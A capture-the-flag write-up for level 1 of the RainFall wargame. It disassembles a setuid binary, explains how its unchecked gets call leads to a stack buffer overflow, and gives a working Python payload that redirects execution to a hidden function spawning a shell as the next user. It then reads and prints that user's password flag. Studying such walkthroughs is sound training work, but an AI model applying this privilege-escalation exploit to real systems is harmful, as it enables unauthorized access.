## Level 1

Level 1 starts off with another binary, this one requests user input:

```bash
level1@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
level1@RainFall:~$ ./level1 
input
```

Lets inspect the binary using `gdb`:

```
(gdb) disass main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
```

We can already assume a couple different things from just this small main.
We can see that there are 80 (0x50) bytes reserved on the stack of which 64 (0x50 - 0x10) are used as a pointer.
That pointer is being passed to the function `gets`.
This is a notorious function, it requests input from the user but since it does not do any size checks it is prone to `buffer overflow attacks`.
The man page of `gets` reads:
```
DESCRIPTION
       Never use this function.
```

That's a good start, but in order to perform our `buffer overflow attack` we need to find some code to execute.
Using `objdump` we can easily scroll through the entire binary to see if there is anything usable.

```asm
08048444 <run>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp
 804844a:	a1 c0 97 04 08       	mov    0x80497c0,%eax
 804844f:	89 c2                	mov    %eax,%edx
 8048451:	b8 70 85 04 08       	mov    $0x8048570,%eax
 8048456:	89 54 24 0c          	mov    %edx,0xc(%esp)
 804845a:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
 8048461:	00 
 8048462:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
 8048469:	00 
 804846a:	89 04 24             	mov    %eax,(%esp)
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave  
 804847f:	c3                   	ret
```

And to our luck, there just so happens to be an unused function `run`.
Without going into too much detail, this function prints the string `"Good... Wait what?\n"` on the `stdout`.
After doing so it calls `system` with the argument `"/bin/sh"`.

Now we can start crafting our attack!

First thing we have to figure out is the `offset` that lets us put the address of the `run` function on the stack where the code expects the regular return address.

Looking back at the assembly of our main we can visualize what the stack looks like.

```asm
   push   %ebp
   mov    %esp,%ebp
   and    $0xfffffff0,%esp
   sub    $0x50,%esp
   lea    0x10(%esp),%eax
```

First up we have the not visible saved `eip` register, or the return value we want to change.
After this we have 4 bytes for the `ebp` push.
Then the stack gets aligned by 8 bytes.
Now there is an allocation of 80 (0x50) bytes on the stack.
The pointer eventually given to `gets` is not the full 80 bytes however, as the stack pointer gets indexed on 0x10, this is most likely done as another alignment.
This means that the buffer being given is 64 bytes long.

Putting all of this together we can assert that the offset we need to change is at 76 bytes:
We have 64 bytes for the buffer itself, then we add 8 for the alignment, making 72 after which we add an additional 4 for the `ebp` push.

Visualizing it, we would see this:

```
Higher Memory Addresses
+-----------------------+
|  Saved EIP            |  <--- The value we need to change
|  (Return Address)     |
+-----------------------+  <--- Offset = 76
|  Saved EBP            |
|  (Old Frame Pointer)  |
+-----------------------+  <--- Offset = 72
|                       |
|  Alignment Padding    |  <--- Alignment caused by the "and   0xfffffff0,%esp"
|  (Unused Space)       |       In our case it will be the full 8 bytes
|                       |
+-----------------------+  <-- Offset = 64
|                       |
|   64 bytes buffer     |
|                       |
+-----------------------+  <--- ESP + 0x10 (Start of Buffer for gets)
|                       |
|  Stack Alignment      |
|  (Additional 0x10)    |  <--- The 16 bytes below buffer start
|                       |
+-----------------------+  <--- ESP (Current during gets)
Lower Memory Addresses
```

So lets craft our payload!
We need to send 76 filler-bytes after which the address of `run` needs to be set.
Since we are on a Little-Endian machine the address bytes need to be in a reverse order.
We'll be using `Python` to print the bytes into a payload file.
We would like to pipe it straight into the `level1` binary but this would cause an `EOF` to be sent as well.
This instantly closes the shell that gets opened, so we'll use `cat -` to print it on the stdin instead:

```bash
python -c "print('A'*76 + '\x44\x84\x04\x08')" > payload && cat payload - | ./level1
```

Now we have shell access as the `level2` user!
Lets read out the `.pass` file and claim our flag:

```bash
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
